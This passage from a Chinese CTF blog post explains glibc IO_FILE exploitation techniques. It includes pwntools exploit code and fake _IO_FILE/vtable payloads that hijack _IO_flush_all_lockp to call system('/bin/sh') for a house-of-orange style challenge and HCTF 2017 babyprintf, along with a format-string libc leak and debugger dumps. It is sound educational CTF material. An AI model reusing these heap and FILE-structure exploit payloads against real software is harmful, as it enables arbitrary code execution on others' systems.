+<p>在第一个条件中，fp-&gt;_vtable_offset的偏移是0x82，在exp将其伪造成0。<br>在第三个条件中，需要伪造fp-&gt;_wide_data-&gt;_IO_write_ptr和fp-&gt;_wide_data-&gt;_IO_write_base的值，_wide_data的偏移是0x50，调试可发现这两个值在fp-&gt;_wide_data中的偏移，其中rax是fp-&gt;_wide_data，0x20是_IO_write_ptr的偏移，0x18是_IO_write_base的偏移。<br><img src="/2019/04/11/IO-FILE利用总结-二/3.png" alt="3"><br>所以在exp中构造如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">vtable_addr = heap_base + <span class="number">0x278</span> <span class="comment">#0x3278</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x2e</span> * p64(<span class="number">0</span>)</span><br><span class="line">stream = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">stream += p64(<span class="number">0xdeadbeef</span>) + p64(IO_list_all<span class="number">-0x10</span>) <span class="comment">#fd bk</span></span><br><span class="line"></span><br><span class="line">stream = stream.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">stream += p64(heap_base + <span class="number">0x250</span>) <span class="comment">#_wide_data 0x3250</span></span><br><span class="line">stream = stream.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">stream += p64(<span class="number">1</span>)  <span class="comment">#_mode</span></span><br><span class="line"></span><br><span class="line">payload += stream</span><br><span class="line">payload += <span class="number">2</span>*p64(<span class="number">0</span>) + p64(vtable_addr) <span class="comment">#0xd8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>) <span class="comment">#fp-&gt;_wide_data-&gt;_IO_write_ptr</span></span><br><span class="line">payload += p64(<span class="number">3</span>) <span class="comment">#fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#vtable</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">edit_page(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure></p>
+<p>最后在旧的top chunk处构造的fake _IO_FILE：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (*(struct _IO_FILE_plus*)<span class="number">0x603180</span>)</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0xdeadbeef</span> &lt;error: Cannot access memory at address <span class="number">0xdeadbeef</span>&gt;, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd2510</span> <span class="string">""</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    _shortbuf = <span class="string">""</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x603250</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">1</span>, </span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x603278</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>构造的虚表：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (*(struct _IO_jump_t *)<span class="number">0x603278</span>)</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x0</span>, </span><br><span class="line">  __overflow = <span class="number">0x7ffff7a52390</span> &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x0</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后触发_IO_flush_all_lockp-&gt;_IO_OVERFLOW(fp, EOF)也就是_IO_flush_all_lockp-&gt;system(“/bin/sh”)，获得shell。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure></p>
+<h1 id="HCTF-2017-babyprintf"><a href="#HCTF-2017-babyprintf" class="headerlink" title="HCTF 2017 babyprintf"></a>HCTF 2017 babyprintf</h1><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>这是HCTF2017的一道pwn题目，libc版本是2.24，可以申请不超过0x1000的chunk，有一个明显的格式化字符串的漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./babyprintf</span><br><span class="line">size: <span class="number">12</span></span><br><span class="line">string: %p%p%p%p</span><br><span class="line">result: <span class="number">0x7ffff7dd37800</span>x7ffff7b042c00x7ffff7fdf7000x8size:</span><br></pre></td></tr></table></figure></p>
+<p>题目开保护的情况：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p>
+<h2 id="题目漏洞-1"><a href="#题目漏洞-1" class="headerlink" title="题目漏洞"></a>题目漏洞</h2><p>对于这个格式化字符串的漏洞，题目中开了FORTIFY保护，这个保护针对格式化字符串有一些对抗，可以看到所有的printf都替换成了__printf_chk：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rbx@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax@3</span></span><br><span class="line"></span><br><span class="line">  sub_400950();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"size: "</span>);</span><br><span class="line">    v4 = my_read();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0x1000</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"string: "</span>);</span><br><span class="line">    gets((__int64)v3); <span class="comment">//溢出</span></span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"result: "</span>);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, (__int64)v3); <span class="comment">//格式化字符串</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"too long"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>关于格式化字符串详细的介绍可以看这篇<a href="https://blog.kyrios.cn/2017/10/14/fmteulogy/" target="_blank" rel="noopener">文章</a>。简单来说，这个保护有以下两条限制：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">含有%nd的格式化字符串不能位于程序内存的可写地址。</span><br><span class="line">当使用位置参数时，必须使用范围内的所有参数，比如使用%<span class="number">5</span>$x，必须同时使用<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>、<span class="number">4</span>。</span><br></pre></td></tr></table></figure></p>
+<p>但其实比如%1$x%2$x这样的格式化字符串后面我也没有用到，我只使用格式化字符串漏洞去泄露libc了，而且用的是连续的”%p”。<br>程序中还用了gets()来接受输入，导致一个堆溢出的漏洞，相当于对输入的数据没有限制，无限溢出。这里就想到了house of orange，但时libc的版本是2.24，增加了新的check，但仍然可以利用_IO_str_jumps中的一些函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/strops.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.24 /libio/libioP.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_INIT(NAME, VALUE) VALUE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)</span></span><br></pre></td></tr></table></figure></p>
+<p>这里利用的是__libc_IO_vtables中的_IO_str_finish。</p>
+<h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>首先利用溢出修改top chunk的size域:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(size,data)</span>:</span></span><br><span class="line">   <span class="comment">#p.recvuntil("size: ")</span></span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(<span class="string">"string: "</span>)</span><br><span class="line">   p.sendline(data)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfe1</span>)</span><br><span class="line">input(<span class="number">0x10</span>,payload)</span><br></pre></td></tr></table></figure></p>
+<p>申请一个较大的chunk,并输入格式化字符串泄露libc，栈里面正好有一个__libc_start_main+0x241。<br><img src="/2019/04/11/IO-FILE利用总结-二/4.png" alt="4"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##leak libc base</span></span><br><span class="line">input(<span class="number">0x1000</span>,<span class="string">"%p%p%p%p%p%p"</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">"size: "</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">leak_addr = int(data.split(<span class="string">"0x"</span>)[<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc_base = leak_addr - libc.symbols["__libc_start_main"] - 240</span></span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">"__libc_start_main"</span>] - <span class="number">241</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br></pre></td></tr></table></figure></p>
+<p>接下来同样是Unsorted Bin Attack，将旧的top chunk的bk修改为_IO_list_all-0x10，因为我们只能在申请chunk的时候输入string的内容，但是因为有一个溢出的漏洞，我们可以输入任意长度的内容，所以可以申请一个chunk后，再越过这个chunk的大小去修改unsorted bin中的bk。另外，构造符合跳转到_IO_str_finish的条件，_IO_str_finish函数实现如下。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/strops.c</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到我们需要构造的条件有：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_buf_base为真，(fp-&gt;_flags &amp; _IO_USER_BUF)为假</span><br><span class="line">fp-&gt;_IO_buf_base为bin_sh_addr</span><br><span class="line">fp-&gt;_s._free_buffer为system函数地址</span><br></pre></td></tr></table></figure></p>
+<p>可以看到_IO_str_finish的条件很简单，但是如何去触发_IO_str_finish，参考<a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html" target="_blank" rel="noopener">这篇文章</a>的思路，一方面利用fclose(fp)，另一方面可以利用_IO_flush_all_lockp-&gt;_IO_OVERFLOW(fp, EOF)，_IO_OVERFLOW(fp, EOF)是正确执行时根据函数跳转表中的偏移得到函数__overflow，如果我们将虚表地址修改为实际虚表地址-0x8,符合__libc_IO_vtables地址安全检查的范围内，在实际执行时_IO_str_overflow偏移-8处正好是_IO_str_finish。所以我们在构造时也需要满足_IO_flush_all_lockp-&gt;_IO_OVERFLOW(fp, EOF)的条件：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p>
+<p>综合_IO_str_finish构造条件，得到最终构造条件如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_IO_OVERFLOW(fp, EOF):</span></span><br><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line"><span class="comment">//\_IO\_str\_finish</span></span><br><span class="line">fp-&gt;_IO_buf_base为bin_sh_addr</span><br><span class="line">fp-&gt;_s._free_buffer为system函数地址</span><br></pre></td></tr></table></figure></p>
+<p>关于_s._free_buffer关于fp的偏移，可以在IDA中看到正好是0xe8：<br><img src="/2019/04/11/IO-FILE利用总结-二/5.png" alt="5"></p>
+<p>exp中payload最终构造如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_IO_str_jumps = libc_base + <span class="number">0x3be4c0</span></span><br><span class="line">_IO_list_all = libc_base + libc.symbols[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh\x00"</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x200</span></span><br><span class="line">stream = p64(<span class="number">0</span>)                            <span class="comment">#flag</span></span><br><span class="line">stream += p64(<span class="number">0x61</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>) + p64(_IO_list_all<span class="number">-0x10</span>)  <span class="comment">#bk     </span></span><br><span class="line">stream += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)                  <span class="comment">#_IO_write_base + _IO_write_ptr</span></span><br><span class="line">stream += p64(<span class="number">0</span>)</span><br><span class="line">stream +=  p64(binsh_addr)                 <span class="comment">#_IO_buf_base offset 0x38</span></span><br><span class="line">stream = stream.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>)                           <span class="comment">#_mode</span></span><br><span class="line">stream += p64(<span class="number">0</span>) *<span class="number">2</span></span><br><span class="line">stream += p64(_IO_str_jumps<span class="number">-0x8</span>)           <span class="comment">#vtable offset 0xd8</span></span><br><span class="line">stream = stream.ljust(<span class="number">0xe8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">stream += p64(system_addr)                 <span class="comment">#offset 0xe8</span></span><br><span class="line">payload += stream</span><br><span class="line">input(<span class="number">0x200</span>,payload)</span><br></pre></td></tr></table></figure></p>
+<p>最终触发_IO_flush_all_lockp，获得shell：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwnable-tw-seethefile"><a href="#pwnable-tw-seethefile" class="headerlink" title="pwnable.tw seethefile"></a>pwnable.tw seethefile</h1><h2 id="题目概述-1"><a href="#题目概述-1" class="headerlink" title="题目概述"></a>题目概述</h2><h2 id="题目漏洞-2"><a href="#题目漏洞-2" class="headerlink" title="题目漏洞"></a>题目漏洞</h2><h2 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://tacxingxing.com/2018/01/12/pwnabletw-bookwriter/" target="_blank" rel="noopener">http://tacxingxing.com/2018/01/12/pwnabletw-bookwriter/</a><br><a href="https://bbs.pediy.com/thread-222735.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222735.htm</a><br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn利用总结/" rel="tag"># pwn利用总结</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/05/Chunk-overlapping利用总结/" rel="next" title="Chunk overlapping利用总结">
+                <i class="fa fa-chevron-left"></i> Chunk overlapping利用总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/14/pwnable-tw-kidding/" rel="prev" title="pwnable.tw kidding">
+                pwnable.tw kidding <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
